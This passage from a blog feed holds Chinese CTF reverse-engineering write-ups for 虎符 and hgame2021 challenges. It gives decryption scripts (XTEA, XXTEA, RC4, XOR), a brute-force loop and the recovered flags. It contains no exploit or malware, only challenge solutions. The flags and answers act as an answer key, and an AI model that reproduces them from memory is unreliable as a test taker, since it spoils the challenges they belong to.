class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> string[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> input[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> string_len = <span class="built_in">strlen</span>(string);</span><br><span class="line"><span class="keyword">int</span> input_len = <span class="built_in">strlen</span>(input);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span>* s = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(input_len &lt;&lt; <span class="number">10</span>);<span class="comment">// input_len * 2^10</span></span><br><span class="line"><span class="built_in">memset</span>((<span class="keyword">void</span>*)s, <span class="number">0</span>, input_len &lt;&lt; <span class="number">10</span>);</span><br><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; input_len; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">256</span>; j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (j != input[i]) &#123;</span><br><span class="line">s[<span class="number">256</span> * i + j] = s[<span class="number">256</span> * count + j]; <span class="comment">//其他全是填充这个</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">s[<span class="number">256</span> * i + j] = i + <span class="number">1</span>; <span class="comment">//每一次循环只执行一次这个</span></span><br><span class="line">&#125;</span><br><span class="line">count = s[<span class="number">256</span> * count + input[i]]; <span class="comment">//count=i+1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> sign = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; string_len; k++) &#123;</span><br><span class="line">sign = s[<span class="number">256</span> * sign + string[k]];</span><br><span class="line"><span class="keyword">if</span> (sign == input_len) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, k - input_len + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/// k-input_len+1=7</span></span><br><span class="line"><span class="comment">/// k=6+0xE=</span></span><br></pre></td></tr></table></figure><p>题目中有两个字符串，所以生成了两张表，两张表中相同的值就是需要输入的flag</p><p><code>Ninja Must Die 3 Is A Cruel Game, So Hard For Me</code></p><p><code>I Love Ninja Must Die 3. Beautiful Art And Motive Operation Is Creative.</code></p><p>两个字符串中相同的值为<code>Ninja Must Die</code></p><h2 id="虎符-gocrypt"><a href="#虎符-gocrypt" class="headerlink" title="虎符-gocrypt"></a>虎符-gocrypt</h2><p>变种的<code>xtea</code>在写脚本的时候忘记了小端存储，这个地方搞了很久，以后遇到不能在犯错误了</p><p>用插件还原符号表后看到函数并没有多少，输入检测函数<code>main_check</code>，数据加密函数<code>main_main__ptr_myCipher_Encrypt</code></p><p><code>main_check</code>函数中有一个正则匹配来规定flag输入的格式</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210409083421073.png" alt="main_check"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">正则匹配格式：flag&#123;([0-9a-f]&#123;8&#125;)-([0-9a-f]&#123;4&#125;)-([0-9a-f]&#123;4&#125;)-([0-9a-f]&#123;4&#125;)-([0-9a-f]&#123;12&#125;)&#125;</span><br></pre></td></tr></table></figure><p>在进入<code>main_check</code>返回一个值给标志，判断是否进入下一个步骤</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210409083659618.png"></p><p><code>main__ptr_myCipher_Encrypt</code>函数中的加密算法就是变种的<code>xtea</code>加密，随机数变成了<code>0x12345678</code></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210409082900061.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">XTEA_decrypt</span><span class="params">(<span class="keyword">uint32_t</span> rounds, <span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> delta = <span class="number">0x12345678</span>;</span><br><span class="line"><span class="keyword">uint32_t</span> sum = rounds * delta;</span><br><span class="line"><span class="keyword">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rounds; i++) &#123;</span><br><span class="line">v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + k[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">sum -= delta;</span><br><span class="line">v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + k[sum &amp; <span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line">v[<span class="number">0</span>] = v0;</span><br><span class="line">v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> rounds = <span class="number">32</span>;</span><br><span class="line"><span class="keyword">uint32_t</span> v[<span class="number">2</span>][<span class="number">2</span>] = &#123; &#123; <span class="number">0x0ec311f0</span>, <span class="number">0x45c79af3</span> &#125;,</span><br><span class="line"> &#123; <span class="number">0xedf5d910</span>, <span class="number">0x542702cb</span> &#125; &#125;;</span><br><span class="line"><span class="keyword">uint32_t</span> k[<span class="number">4</span>] = &#123; <span class="number">0x00010203</span>, <span class="number">0x04050607</span>, <span class="number">0x08090a0b</span>, <span class="number">0x0c0d0e0f</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">XTEA_decrypt</span>(rounds, v[<span class="number">0</span>], k);</span><br><span class="line"><span class="built_in">XTEA_decrypt</span>(rounds, v[<span class="number">1</span>], k);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x-%x\n&quot;</span>, v[<span class="number">0</span>][<span class="number">0</span>], v[<span class="number">0</span>][<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x-%x\n&quot;</span>, v[<span class="number">1</span>][<span class="number">0</span>], v[<span class="number">1</span>][<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;3bbcf9ea-2918-4fee-8a2e-201b47dfcb4e&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210409084718527.png"></p><h2 id="虎符-CrackMe"><a href="#虎符-CrackMe" class="headerlink" title="虎符-CrackMe"></a>虎符-CrackMe</h2><p>这个题需要输入两次，第一次输入后判断输入的长度，长度需要17位，输入后将输入的字符串的前7位和后10位分割，分别存储在不同的内存中</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210409085306463.png"></p><p>第二次输入需要输入一个数字，在经过两轮简单的计算后与指定的两个值进行比较，直接写脚本爆破，最后计算出需要输入的值为<code>90038</code></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210409085615540.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 爆破脚本，单线程大概需要半个小时左右</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">cal</span><span class="params">(<span class="keyword">double</span> a, <span class="keyword">double</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">double</span> _a;</span><br><span class="line"><span class="keyword">double</span> var = <span class="number">0.0</span>;</span><br><span class="line">_a = a;</span><br><span class="line">a = <span class="built_in">pow</span>(a, b - <span class="number">1</span>);</span><br><span class="line">*(&amp;var + <span class="number">1</span>) = *(&amp;a + <span class="number">1</span>);</span><br><span class="line">var = a / <span class="built_in">exp</span>(_a);</span><br><span class="line"><span class="keyword">return</span> var;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">double</span> input_num;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">99999</span>; i++) &#123;</span><br><span class="line">input_num = i;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line"><span class="keyword">double</span> v16 = <span class="number">0.0</span>, v17 = <span class="number">0.0</span>, v18 = <span class="number">0.0</span>, v19 = <span class="number">0.0</span>;</span><br><span class="line"><span class="keyword">int</span> num1 = <span class="number">0x13B03</span>, num2 = <span class="number">0x5A2</span>;</span><br><span class="line">v19 = (<span class="keyword">double</span>)((<span class="keyword">int</span>)input_num / <span class="number">0x305B</span>) + <span class="number">1.0</span>;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">v17 = v17 + <span class="built_in">cal</span>(v18, v19) * <span class="number">0.001</span>;</span><br><span class="line">v18 = v18 + <span class="number">0.001</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (v18 &lt;= <span class="number">100.0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">double</span> v21 = <span class="number">0.0</span>;</span><br><span class="line"><span class="keyword">double</span> v22 = (<span class="keyword">double</span>)((<span class="keyword">int</span>)input_num % <span class="number">0x305B</span>) + <span class="number">1.0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v16 = v16 + <span class="built_in">cal</span>(v21, v22) * <span class="number">0.001</span>;</span><br><span class="line">v21 = v21 + <span class="number">0.001</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (v21 &lt;= <span class="number">100.0</span>);</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">int</span>)(v17 + v17 + <span class="number">3.0</span>) == num1 &amp;&amp; (<span class="keyword">int</span>)(v16 + v16 + <span class="number">3.0</span>) == num2) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%f&quot;</span>, input_num);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后面就比较简单了，首先将输入的数字转为<code>ascii</code>码，然后在后面追加<code>input_num*2</code>，一共追加5次，取前7位进行异或计算出一个<code>key</code>供后面使用</p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210409090040223.png" style="zoom:67%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Cipher = [<span class="number">8</span>, <span class="number">77</span>, <span class="number">89</span>, <span class="number">6</span>, <span class="number">115</span>, <span class="number">2</span>, <span class="number">64</span>]</span><br><span class="line">key = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">ord</span>,<span class="built_in">list</span>(<span class="string">&quot;9903819&quot;</span>)))</span><br><span class="line">Plain = <span class="built_in">bytes</span>(key[i]^Cipher[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>))</span><br><span class="line"><span class="built_in">print</span>(Plain)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1ti5K3y</span></span><br></pre></td></tr></table></figure><p>后面就是一个标准的<code>RC4</code>加密</p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210409090441592.png" style="zoom: 67%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Cryptodome.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line">Cipher = <span class="built_in">bytes</span>([<span class="number">178</span>, <span class="number">214</span>, <span class="number">142</span>, <span class="number">63</span>, <span class="number">170</span>, <span class="number">20</span>, <span class="number">83</span>, <span class="number">84</span>, <span class="number">198</span>, <span class="number">6</span>])</span><br><span class="line">Key = <span class="string">b&#x27;1ti5K3y&#x27;</span></span><br><span class="line">rc4 = ARC4.new(Key)</span><br><span class="line">Plain = rc4.decrypt(Cipher)</span><br><span class="line"><span class="built_in">print</span>(Plain)</span><br><span class="line"><span class="comment"># RC4_crypt0</span></span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210408214516158.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;h2 id=&quot;红明谷-g0&quot;&gt;&lt;a href=&quot;#红明谷-g0&quot; class=&quot;headerlink&quot; title=&quot;红明谷-g0&quot;&gt;&lt;/a&gt;红明谷-g0&lt;/h2&gt;&lt;p&gt;看名字就是go语言题目，用&lt;code&gt;IDA-golang</summary>
      
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="re" scheme="http://example.com/categories/ctf/re/"/>
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
    <category term="re" scheme="http://example.com/tags/re/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>hgame2021-re部分题解</title>
    <link href="http://example.com/63316/"/>
    <id>http://example.com/63316/</id>
    <published>2021-07-14T04:44:17.030Z</published>
    <updated>2022-01-01T09:53:45.780Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>hgame 2021的逆向部分题解，一道nc题和一道安卓逆向没有做，每周的题目都看了看，做了四分之三左右，杭电的比赛题目出得很有水平，自己学到了很多东西，wp本来说每周都写的，但是懒，比赛都结束一个月了才偷工减料得写出来。有兴趣的师傅凑合着看看吧吧🤪</p><h2 id="RE-week1"><a href="#RE-week1" class="headerlink" title="RE-week1"></a>RE-week1</h2><h3 id="一杯阿帕茶"><a href="#一杯阿帕茶" class="headerlink" title="一杯阿帕茶"></a>一杯阿帕茶</h3><p>明显的TEA加密标志，后面分析为XXTEA加密</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201201051733.png"></p><p>加密后的数据，刚好35位</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201201231341.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MX (((z&gt;&gt;5 ^ y<span class="meta-string">&lt;&lt;2) + (y&gt;</span>&gt;3 ^ z&lt;&lt;4)) ^ ((sum ^ y) + (k[(p&amp;3) ^ e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">XXTEA</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> sum, y, z;</span><br><span class="line"><span class="keyword">uint32_t</span> p, rounds, e;</span><br><span class="line"><span class="keyword">if</span> (n &gt; <span class="number">1</span>) &#123;</span><br><span class="line">rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">sum = <span class="number">0</span>;</span><br><span class="line">z = v[n - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">sum += DELTA;</span><br><span class="line">e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line"><span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++) &#123;</span><br><span class="line">y = v[p + <span class="number">1</span>];</span><br><span class="line">z = v[p] += MX;</span><br><span class="line">&#125;</span><br><span class="line">y = v[<span class="number">0</span>];</span><br><span class="line">z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line">&#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>) &#123;</span><br><span class="line">n = -n;</span><br><span class="line">rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">sum = rounds * DELTA;</span><br><span class="line">y = v[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line"><span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--) &#123;</span><br><span class="line">z = v[p - <span class="number">1</span>];</span><br><span class="line">y = v[p] -= MX;</span><br><span class="line">&#125;</span><br><span class="line">z = v[n - <span class="number">1</span>];</span><br><span class="line">y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">sum -= DELTA;</span><br><span class="line">&#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> arr[] = &#123;<span class="number">3880694563</span>, <span class="number">3081185334</span>, <span class="number">1506439138</span>, <span class="number">2524759489</span>, <span class="number">3883935348</span>, <span class="number">1026381030</span>, <span class="number">2325545814</span>, <span class="number">2581382044</span>, <span class="number">1881594093</span>, <span class="number">1781792173</span>, <span class="number">4103492874</span>, <span class="number">1553756062</span>, <span class="number">468045900</span>, <span class="number">1730391575</span>, <span class="number">1383114178</span>, <span class="number">2890011402</span>, <span class="number">2227070898</span>, <span class="number">1885128569</span>, <span class="number">1548828056</span>, <span class="number">4214676013</span>, <span class="number">571971141</span>, <span class="number">1558401693</span>, <span class="number">3515474427</span>, <span class="number">3898332297</span>, <span class="number">1942540575</span>, <span class="number">1421197718</span>, <span class="number">3061626000</span>, <span class="number">555214026</span>, <span class="number">2648963476</span>, <span class="number">794468778</span>, <span class="number">2816999933</span>, <span class="number">3272437419</span>, <span class="number">464379036</span>, <span class="number">877899850</span>, <span class="number">2460223225</span>&#125;;</span><br><span class="line"><span class="keyword">uint32_t</span> key[] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> &#125;;</span><br><span class="line"><span class="built_in">XXTEA</span>(<span class="number">-35</span>, arr, key);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">35</span>; i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, arr[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201201420062.png"></p><h3 id="Welcome-to-reverse-world"><a href="#Welcome-to-reverse-world" class="headerlink" title="Welcome to reverse world !"></a>Welcome to reverse world !</h3><p>简单题，一个异或直接搞定</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201201736107.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">re</span>():</span></span><br><span class="line">    addr = <span class="number">0x00007FF7F7513480</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>):</span><br><span class="line">        flag += <span class="built_in">chr</span>((<span class="number">0xff</span> - i) ^ get_byte(addr +i))</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201201838100.png"></p><h3 id="pypy"><a href="#pypy" class="headerlink" title="pypy"></a>pypy</h3><p>给了我们python字节码，需要我们自己还原成python代码，下面贴还原过后的代码，加密过程很简单</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">input_func</span>():</span></span><br><span class="line">    raw_flag = <span class="built_in">input</span>(<span class="string">&#x27;give me your flag:\n&#x27;</span>)</span><br><span class="line">    cipher = <span class="built_in">list</span>(raw_flag[<span class="number">6</span>:-<span class="number">1</span>])</span><br><span class="line">    length = <span class="built_in">len</span>(cipher)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length // <span class="number">2</span>):</span><br><span class="line">        cipher[<span class="number">2</span>*i], cipher[<span class="number">2</span>*i+<span class="number">1</span>] = cipher[<span class="number">2</span>*i+<span class="number">1</span>] , cipher[<span class="number">2</span>*i]</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        res.append(<span class="built_in">ord</span>(cipher[i]) ^ i)</span><br><span class="line">    res = <span class="built_in">bytes</span>(res).<span class="built_in">hex</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;your flag: &#x27;</span> + res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(dis.dis(input_func))</span></span><br></pre></td></tr></table></figure><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Cip</span>():</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    res = []</span><br><span class="line">    cipher = <span class="string">&#x27;30466633346f59213b4139794520572b45514d61583151576638643a&#x27;</span></span><br><span class="line">    length = <span class="built_in">len</span>(cipher)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, length, <span class="number">2</span>):</span><br><span class="line">        res.append(<span class="built_in">int</span>(cipher[i:i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)):</span><br><span class="line">        flag += <span class="built_in">chr</span>(res[i] ^ i)</span><br><span class="line">    flag = <span class="built_in">list</span>(flag)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag) // <span class="number">2</span>):</span><br><span class="line">        flag[i*<span class="number">2</span>+<span class="number">1</span>], flag[i*<span class="number">2</span>] = flag[i*<span class="number">2</span>],flag[i*<span class="number">2</span> + <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">        <span class="built_in">print</span>(flag[i],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hgame&#123;G00dj0&amp;_H3r3-I$Y@Ur_$L@G!~!~&#125;</span></span><br></pre></td></tr></table></figure><h2 id="RE-week2"><a href="#RE-week2" class="headerlink" title="RE-week2"></a>RE-week2</h2><h3 id="helloRe2"><a href="#helloRe2" class="headerlink" title="helloRe2"></a>helloRe2</h3><p>有两处检测，第一处直接明文比较，但是注意要倒序</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210326200613164.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password1: 